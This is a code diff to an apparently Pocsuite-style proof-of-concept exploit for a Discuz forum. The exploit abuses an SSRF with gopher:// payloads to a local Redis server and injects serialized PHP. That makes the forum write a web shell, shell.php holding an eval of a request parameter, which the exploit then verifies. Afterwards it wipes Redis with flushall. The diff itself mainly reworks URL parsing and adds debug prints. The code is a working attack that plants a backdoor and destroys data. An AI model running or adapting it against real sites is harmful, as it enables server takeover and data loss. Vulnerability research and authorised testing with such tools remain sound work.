@@ -49,20 +49,17 @@ class TestPOC(POCBase):
                    's:13:\\\"rewritestatus\\\";a:1:{s:7:\\\"plugins\\\";i:1;}}\')'\
                    ' end;return 1;" 0 %250D%250Aquit')
         #
-        web_url = self.url.rpartition('/')
-        
-        self.url = web_url[0]+ '/' + web_url[2] + '/'
-        
-        vul_url = self.url + ssrf_url + payload
-        
-        
-        base_rep = req.get(vul_url)
+        tmpparse = urlparse.urlparse(self.url)
+        self.url = tmpparse.scheme + '://'+ tmpparse.netloc + '/' +tmpparse.path.split('/')[1]
+        vul_url = self.url + '/' + ssrf_url + payload
 
-        web_url = self.url.rpartition('/')
+        base_rep = req.get(vul_url)
+        print base_rep.status_code
         while base_rep.status_code == 200:
             shell_url = self.url + '/forum.php?mod=ajax&inajax=yes&action=getthreadtypes'
+            print shell_url
             rep = req.get(shell_url)
-
+            
             if rep.status_code == 200:
                 shell_payload = 'file_put_contents("shell.php","<?php @eval(\$_REQUEST[c1tas]);?>");phpinfo();'
                 shell_payload_b64 = base64.b64encode(shell_payload)
@@ -72,7 +69,7 @@ class TestPOC(POCBase):
                 req.get(attack_url)
                 
                 flag = "phpinfo";
-                shell_url = web_url[0] + '/' + 'shell.php'
+                shell_url = self.url + '/' + 'shell.php'
                 verify_url = shell_url + "?c1tas=phpinfo();"
                 rep = req.get(verify_url)
                 if rep.status_code == 200 and flag in rep.content:
@@ -84,11 +81,10 @@ class TestPOC(POCBase):
                 payload_flush = 'gopher://127.0.0.1:6379/_*1%250D%250A$8%250D%250Aflushall%250D%250Aquit'
                 recover_url = self.url + ssrf_url +payload_flush
                 req.get(recover_url)
-                req.get(web_url[0] + '/forum.php')
+                req.get(self.url + '/forum.php')
 
                 break
 
-            web_url = web_url[0].rpartition('/')
 
         return self.parse_output(result)
 
@@ -110,14 +106,11 @@ class TestPOC(POCBase):
                    'a:1:{s:7:\\\"plugins\\\";s:10:\\\"phpinfo();\\\";}}}'\
                    's:13:\\\"rewritestatus\\\";a:1:{s:7:\\\"plugins\\\";i:1;}}\')'\
                    ' end;return 1;" 0 %250D%250Aquit')
-
-        web_url = self.url.rpartition('/')
         
-        self.url = web_url[0]+ '/' + web_url[2] + '/'
-        
-        vul_url = self.url + ssrf_url + payload
-        
-        #vul_url = self.url + ssrf_url +payloal
+        tmpparse = urlparse.urlparse(self.url) 
+        self.url = tmpparse.scheme + '://'+ tmpparse.netloc + '/' +tmpparse.path.split('/')[1]
+        vul_url = self.url + '/' + ssrf_url + payload
+ 
         
         base_rep = req.get(vul_url)
         
@@ -132,11 +125,9 @@ class TestPOC(POCBase):
                 payload_flush = 'gopher://127.0.0.1:6379/_*1%250D%250A$8%250D%250Aflushall%250D%250Aquit'
                 recover_url = self.url + ssrf_url + payload_flush
                 req.get(recover_url)
-                req.get(web_url[0] + '/forum.php')
+                req.get(self.url + '/forum.php')
 
                 break
-
-            web_url = web_url[0].rpartition('/')
 
         return self.parse_output(result)
 
